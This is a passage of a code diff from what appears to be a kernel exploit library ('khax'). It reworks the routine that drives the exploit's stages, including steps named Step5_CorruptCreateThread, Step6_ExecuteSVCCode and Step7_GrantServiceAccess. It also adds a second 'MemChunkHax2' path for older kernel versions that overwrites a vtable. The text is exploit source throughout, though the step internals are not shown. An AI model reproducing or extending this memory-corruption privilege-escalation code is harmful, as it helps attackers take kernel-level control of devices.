-	if (Result result = hax.Step5_CorruptCreateThread())
-	{
-		KHAX_printf("khaxInit: Step5 failed: %08lx\n", result);
-		return result;
-	}
-	if (Result result = hax.Step6_ExecuteSVCCode())
-	{
-		KHAX_printf("khaxInit: Step6 failed: %08lx\n", result);
-		return result;
-	}
-	if (Result result = hax.Step7_GrantServiceAccess())
-	{
-		KHAX_printf("khaxInit: Step7 failed: %08lx\n", result);
-		return result;
+		// Run through the steps.
+		if (Result result = hax.Step1_Initialize())
+		{
+			KHAX_printf("khaxInit: Step1 failed: %08lx\n", result);
+			return result;
+		}
+		if (Result result = hax.Step2_AllocateMemory())
+		{
+			KHAX_printf("khaxInit: Step2 failed: %08lx\n", result);
+			return result;
+		}
+		if (Result result = hax.Step3_SurroundFree())
+		{
+			KHAX_printf("khaxInit: Step3 failed: %08lx\n", result);
+			return result;
+		}
+		if (Result result = hax.Step4_VerifyExpectedLayout())
+		{
+			KHAX_printf("khaxInit: Step4 failed: %08lx\n", result);
+			return result;
+		}
+		if (Result result = hax.Step5_CorruptCreateThread())
+		{
+			KHAX_printf("khaxInit: Step5 failed: %08lx\n", result);
+			return result;
+		}
+		if (Result result = hax.Step6_ExecuteSVCCode())
+		{
+			KHAX_printf("khaxInit: Step6 failed: %08lx\n", result);
+			return result;
+		}
+		if (Result result = hax.Step7_GrantServiceAccess())
+		{
+			KHAX_printf("khaxInit: Step7 failed: %08lx\n", result);
+			return result;
+		}
+	} else if(versionData->m_kernelVersion <= SYSTEM_VERSION(2, 50, 9)) {
+		KHAX_printf("verdat s=%08lx\n", versionData->m_slabHeapVirtualAddress);
+
+		// Create the hack object.
+		MemChunkHax2 hax{ versionData };
+
+		// Run through the steps.
+		if (Result result = hax.Step1_Initialize())
+		{
+			KHAX_printf("khaxInit: Step1 failed: %08lx\n", result);
+			return result;
+		}
+		if (Result result = hax.Step2_IsolatePage())
+		{
+			KHAX_printf("khaxInit: Step2 failed: %08lx\n", result);
+			return result;
+		}
+		if (Result result = hax.Step3_OverwriteVtable())
+		{
+			KHAX_printf("khaxInit: Step3 failed: %08lx\n", result);
+			return result;
+		}
+		if (Result result = hax.Step4_GrantServiceAccess())
+		{
+			KHAX_printf("khaxInit: Step4 failed: %08lx\n", result);
+			return result;
+		}
 	}
 
 	KHAX_printf("khaxInit: done\n");
